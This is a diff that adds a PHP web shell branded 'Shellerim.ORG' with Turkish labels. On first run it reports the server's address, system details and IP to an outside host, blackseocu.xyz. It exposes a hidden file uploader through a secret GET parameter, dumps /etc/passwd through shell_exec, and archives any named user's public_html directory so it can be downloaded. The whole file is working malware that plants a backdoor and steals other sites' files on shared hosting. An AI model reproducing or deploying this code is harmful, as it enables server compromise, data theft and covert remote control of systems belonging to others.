@@ -1,0 +1,11 @@
+<?php  set_time_limit(0); error_reporting(0); $dosyaadii = $_SERVER['PHP_SELF']; preg_match('@/(.*?).php@si',$dosyaadii,$dosyaadiii); $dosyaadiduzenle = str_replace('/','-',$dosyaadiii[1]); $dosyaadison = $dosyaadiduzenle.".txt"; if(!file_exists($dosyaadison)) { touch($dosyaadison); $adres = $_SERVER['SERVER_NAME']."/".$_SERVER['PHP_SELF']; $ip = $_SERVER['SERVER_ADDR']; $y = urlencode("http://{$adres}|".php_uname()."|{$ip}|".$_SERVER['SERVER_NAME'].""); $x = "http://blackseocu.xyz/geldim2.php?ben={$y}"; if(function_exists('curl_init')) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $git = curl_exec($ch); curl_close($ch); if($git == false){ @$git = file_get_contents($cx); } }elseif(function_exists('file_get_contents')){ @$git = file_get_contents($cx); } } if($_GET['golgeler'] == "yukle"){ echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; } else { echo '<b>Basarisiz</b><br><br>'; } } die(); } ?>
+<center>
+<title>Shellerim.ORG (B0RU70)Script &#199;ekici</title>
+<form method="post" action="">
+<?php $passwd=shell_exec("cat /etc/passwd"); echo "<textarea cols='85' rows='17'>"; echo $passwd."\n"; echo "</textarea>"; ?>
+<br>Hedef Username (ex:shellerim) : <br><input type="text" name="user"><br>
+<input type="submit" name="submit" value="&#199;ek"><br>
+<b>NoRsLaR.ORG // Shellerim.ORG - B0RU70</b>
+</form>
+</center>
+<?php ob_start(); set_time_limit(0); class ceker{ public function script($hedef){ $phpself=dirname(__FILE__); $cek=shell_exec("cd /home/".$hedef."/public_html/;tar cvzf ".$phpself."/".$hedef.".tar.gz *"); echo "<center><a href='".$hedef.".tar.gz'>".$hedef.".tar.gz</a></center>"; ob_flush(); flush(); } } if(isset($_POST['submit'])){ $ceker=new ceker(); $ceker->script($_POST['user']); } ?>
